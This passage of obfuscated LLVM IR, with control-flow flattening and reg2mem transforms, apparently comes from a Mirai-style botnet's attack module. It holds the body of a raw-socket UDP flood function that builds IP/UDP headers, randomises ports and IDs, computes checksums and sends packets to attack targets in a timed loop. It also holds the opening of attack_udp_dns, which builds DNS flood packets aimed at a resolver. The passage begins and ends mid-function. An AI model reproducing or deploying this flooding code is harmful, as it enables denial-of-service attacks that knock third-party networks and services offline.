  switch i32 %switchVar1, label %switchDefault [
    i32 -1265712771, label %first
    i32 699735621, label %67
    i32 718549271, label %68
    i32 -1786380591, label %74
    i32 621996701, label %77
    i32 -1200924990, label %78
    i32 -1082597252, label %84
    i32 790928047, label %132
    i32 407398522, label %136
    i32 -66384247, label %172
    i32 -917997420, label %175
    i32 1065377656, label %176
    i32 1809240517, label %177
    i32 1150393761, label %183
    i32 1025025049, label %203
    i32 -1387179204, label %224
    i32 1278289492, label %229
    i32 150064927, label %234
    i32 -960780861, label %239
    i32 1953211406, label %244
    i32 -1251196423, label %249
    i32 -140403404, label %254
    i32 1286001985, label %301
    i32 -1137013655, label %304
    i32 -1205668127, label %310
    i32 -596807375, label %311
    i32 1246447374, label %312
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %65 = icmp eq i32 %.reload, -1
  %66 = select i1 %65, i32 699735621, i32 718549271
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 1246447374, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %69 = load i32, i32* %12, align 4
  %70 = bitcast i32* %11 to i8*
  %71 = call i32 @setsockopt(i32 %69, i32 0, i32 3, i8* %70, i32 4) #6
  %72 = icmp eq i32 %71, -1
  %73 = select i1 %72, i32 -1786380591, i32 621996701
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %12, align 4
  %76 = call i32 @close(i32 %75)
  store i32 1246447374, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1200924990, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %11, align 4
  %80 = load i8, i8* %7, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp slt i32 %79, %81
  %83 = select i1 %82, i32 -1082597252, i32 -917997420
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = call noalias i8* @calloc(i64 128, i64 1) #6
  %86 = load i8**, i8*** %13, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8*, i8** %86, i64 %88
  store i8* %85, i8** %89, align 8
  %90 = load i8**, i8*** %13, align 8
  %91 = load i32, i32* %11, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8*, i8** %90, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  store %struct.iphdr* %95, %struct.iphdr** %23, align 8
  %96 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i64 1
  %98 = bitcast %struct.iphdr* %97 to %struct.udphdr*
  store %struct.udphdr* %98, %struct.udphdr** %24, align 8
  %99 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %100 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %99, i64 1
  %101 = bitcast %struct.udphdr* %100 to i8*
  store i8* %101, i8** %25, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = load i8, i8* %103, align 4
  %105 = and i8 %104, 15
  %106 = or i8 %105, 64
  store i8 %106, i8* %103, align 4
  %107 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %108 = bitcast %struct.iphdr* %107 to i8*
  %109 = load i8, i8* %108, align 4
  %110 = and i8 %109, -16
  %111 = or i8 %110, 5
  store i8 %111, i8* %108, align 4
  %112 = load i8, i8* %14, align 1
  %113 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 1
  store i8 %112, i8* %114, align 1
  %115 = load i32, i32* %21, align 4
  %116 = sext i32 %115 to i64
  %117 = add i64 32, %116
  %118 = trunc i64 %117 to i16
  %119 = call zeroext i16 @htons(i16 zeroext %118) #7
  %120 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 2
  store i16 %119, i16* %121, align 2
  %122 = load i16, i16* %15, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 3
  store i16 %123, i16* %125, align 4
  %126 = load i8, i8* %16, align 1
  %127 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 5
  store i8 %126, i8* %128, align 4
  %129 = load i8, i8* %17, align 1
  %130 = icmp ne i8 %129, 0
  %131 = select i1 %130, i32 790928047, i32 407398522
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %134 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 4
  store i16 %133, i16* %135, align 2
  store i32 407398522, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 6
  store i8 17, i8* %138, align 1
  %139 = load i32, i32* @LOCAL_ADDR, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 8
  store i32 %139, i32* %141, align 4
  %142 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i64 %144
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i32 0, i32 1
  %147 = load i32, i32* %146, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 9
  store i32 %147, i32* %149, align 4
  %150 = load i16, i16* %18, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %153 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %152, i32 0, i32 0
  store i16 %151, i16* %153, align 2
  %154 = load i16, i16* %19, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %157 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %156, i32 0, i32 1
  store i16 %155, i16* %157, align 2
  %158 = load i32, i32* %21, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 12, %159
  %161 = trunc i64 %160 to i16
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 2
  store i16 %162, i16* %164, align 2
  %165 = load i8*, i8** %25, align 8
  %166 = bitcast i8* %165 to i32*
  store i32 -1, i32* %166, align 4
  %167 = load i8*, i8** %25, align 8
  %168 = getelementptr inbounds i8, i8* %167, i64 4
  store i8* %168, i8** %25, align 8
  %169 = load i8*, i8** %25, align 8
  %170 = load i8*, i8** %20, align 8
  %171 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %169, i8* %170, i32 %171)
  store i32 -66384247, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %11, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %11, align 4
  store i32 -1200924990, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1065377656, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1809240517, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %11, align 4
  %179 = load i8, i8* %7, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp slt i32 %178, %180
  %182 = select i1 %181, i32 1150393761, i32 -1137013655
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8**, i8*** %13, align 8
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8*, i8** %184, i64 %186
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %26, align 8
  %189 = load i8*, i8** %26, align 8
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %27, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i64 1
  %193 = bitcast %struct.iphdr* %192 to %struct.udphdr*
  store %struct.udphdr* %193, %struct.udphdr** %28, align 8
  %194 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 2
  %199 = load i8, i8* %198, align 4
  %200 = zext i8 %199 to i32
  %201 = icmp slt i32 %200, 32
  %202 = select i1 %201, i32 1025025049, i32 -1387179204
  store i32 %202, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %205 = load i32, i32* %11, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = call i32 @ntohl(i32 %209) #7
  %211 = call i32 @rand_next()
  %212 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %213 = load i32, i32* %11, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 2
  %217 = load i8, i8* %216, align 4
  %218 = zext i8 %217 to i32
  %219 = lshr i32 %211, %218
  %220 = add i32 %210, %219
  %221 = call i32 @htonl(i32 %220) #7
  %222 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 9
  store i32 %221, i32* %223, align 4
  store i32 -1387179204, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i16, i16* %15, align 2
  %226 = zext i16 %225 to i32
  %227 = icmp eq i32 %226, 65535
  %228 = select i1 %227, i32 1278289492, i32 150064927
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = call i32 @rand_next()
  %231 = trunc i32 %230 to i16
  %232 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 3
  store i16 %231, i16* %233, align 4
  store i32 150064927, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i16, i16* %18, align 2
  %236 = zext i16 %235 to i32
  %237 = icmp eq i32 %236, 65535
  %238 = select i1 %237, i32 -960780861, i32 1953211406
  store i32 %238, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = call i32 @rand_next()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  store i16 %241, i16* %243, align 2
  store i32 1953211406, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i16, i16* %19, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %246, 65535
  %248 = select i1 %247, i32 -1251196423, i32 -140403404
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = call i32 @rand_next()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i32 0, i32 1
  store i16 %251, i16* %253, align 2
  store i32 -140403404, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 7
  store i16 0, i16* %256, align 2
  %257 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %258 = bitcast %struct.iphdr* %257 to i16*
  %259 = call zeroext i16 @checksum_generic(i16* %258, i32 20)
  %260 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 7
  store i16 %259, i16* %261, align 2
  %262 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %263 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %262, i32 0, i32 3
  store i16 0, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %265 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %266 = bitcast %struct.udphdr* %265 to i8*
  %267 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 2
  %269 = load i16, i16* %268, align 2
  %270 = load i32, i32* %21, align 4
  %271 = sext i32 %270 to i64
  %272 = add i64 12, %271
  %273 = trunc i64 %272 to i32
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %264, i8* %266, i16 zeroext %269, i32 %273)
  %275 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %276 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %275, i32 0, i32 3
  store i16 %274, i16* %276, align 2
  %277 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %278 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %277, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %281 = load i32, i32* %11, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i32 0, i32 0
  %285 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %284, i32 0, i32 1
  store i16 %279, i16* %285, align 2
  %286 = load i32, i32* %12, align 4
  %287 = load i8*, i8** %26, align 8
  %288 = load i32, i32* %21, align 4
  %289 = sext i32 %288 to i64
  %290 = add i64 32, %289
  %291 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %292 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %293 = load i32, i32* %11, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 0
  %297 = bitcast %struct.sockaddr_in* %296 to %struct.sockaddr*
  store %struct.sockaddr* %297, %struct.sockaddr** %291, align 8
  %298 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %299 = load %struct.sockaddr*, %struct.sockaddr** %298, align 8
  %300 = call i64 @sendto(i32 %286, i8* %287, i64 %290, i32 16384, %struct.sockaddr* %299, i32 16)
  store i32 1286001985, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i32, i32* %11, align 4
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %11, align 4
  store i32 1809240517, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = call i64 @time(i64* null) #6
  %306 = load i32, i32* %22, align 4
  %307 = sext i32 %306 to i64
  %308 = icmp sgt i64 %305, %307
  %309 = select i1 %308, i32 -1205668127, i32 -596807375
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 1246447374, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  store i32 1065377656, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %311, %310, %304, %301, %254, %249, %244, %239, %234, %229, %224, %203, %183, %177, %176, %175, %172, %136, %132, %84, %78, %77, %74, %68, %67, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i8*
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add nsw i64 %81, %83
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %25, align 4
  %86 = load i8*, i8** %22, align 8
  store i8* %86, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1364543487, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1364543487, label %first
    i32 619564249, label %89
    i32 -1506236536, label %90
    i32 -289914491, label %96
    i32 -120984871, label %97
    i32 -1603704553, label %103
    i32 -269242610, label %106
    i32 -1612992984, label %107
    i32 -2050992999, label %113
    i32 -1810748515, label %169
    i32 -1039080198, label %173
    i32 -1546810831, label %226
    i32 -1918868616, label %231
    i32 -296679909, label %240
    i32 1318543085, label %250
    i32 -1102596679, label %253
    i32 1341058348, label %254
    i32 -724741907, label %257
    i32 847009551, label %272
    i32 956052248, label %275
    i32 -1840867160, label %276
    i32 1469041960, label %277
    i32 398578040, label %283
    i32 595471286, label %305
    i32 -1287802185, label %311
    i32 -957020901, label %316
    i32 -1447082401, label %322
    i32 -1339200376, label %327
    i32 1307958125, label %333
    i32 -1180008050, label %338
    i32 -1772948439, label %344
    i32 -1321213991, label %416
    i32 647335071, label %419
    i32 1028762047, label %425
    i32 -522430827, label %426
    i32 -1981377364, label %427
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %87 = icmp eq i8* %.reload, null
  %88 = select i1 %87, i32 619564249, i32 -1506236536
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -1981377364, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i8*, i8** %22, align 8
  %92 = call i32 @util_strlen(i8* %91)
  store i32 %92, i32* %23, align 4
  %93 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %93, i32* %12, align 4
  %94 = icmp eq i32 %93, -1
  %95 = select i1 %94, i32 -289914491, i32 -120984871
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 -1981377364, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %98 = load i32, i32* %12, align 4
  %99 = bitcast i32* %11 to i8*
  %100 = call i32 @setsockopt(i32 %98, i32 0, i32 3, i8* %99, i32 4) #6
  %101 = icmp eq i32 %100, -1
  %102 = select i1 %101, i32 -1603704553, i32 -269242610
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %12, align 4
  %105 = call i32 @close(i32 %104)
  store i32 -1981377364, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1612992984, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i32, i32* %11, align 4
  %109 = load i8, i8* %7, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp slt i32 %108, %110
  %112 = select i1 %111, i32 -2050992999, i32 956052248
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %114 = call noalias i8* @calloc(i64 600, i64 1) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %29, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %30, align 8
  %128 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i64 1
  %130 = bitcast %struct.udphdr* %129 to %struct.dnshdr*
  store %struct.dnshdr* %130, %struct.dnshdr** %31, align 8
  %131 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %132 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %131, i64 1
  %133 = bitcast %struct.dnshdr* %132 to i8*
  store i8* %133, i8** %32, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %14, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = load i8, i8* %21, align 1
  %148 = zext i8 %147 to i64
  %149 = add i64 41, %148
  %150 = add i64 %149, 2
  %151 = load i32, i32* %23, align 4
  %152 = sext i32 %151 to i64
  %153 = add i64 %150, %152
  %154 = add i64 %153, 4
  %155 = trunc i64 %154 to i16
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 2
  store i16 %156, i16* %158, align 2
  %159 = load i16, i16* %15, align 2
  %160 = call zeroext i16 @htons(i16 zeroext %159) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 3
  store i16 %160, i16* %162, align 4
  %163 = load i8, i8* %16, align 1
  %164 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 5
  store i8 %163, i8* %165, align 4
  %166 = load i8, i8* %17, align 1
  %167 = icmp ne i8 %166, 0
  %168 = select i1 %167, i32 -1810748515, i32 -1039080198
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 4
  store i16 %170, i16* %172, align 2
  store i32 -1039080198, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 6
  store i8 17, i8* %175, align 1
  %176 = load i32, i32* @LOCAL_ADDR, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 8
  store i32 %176, i32* %178, align 4
  %179 = load i32, i32* %24, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 9
  store i32 %179, i32* %181, align 4
  %182 = load i16, i16* %18, align 2
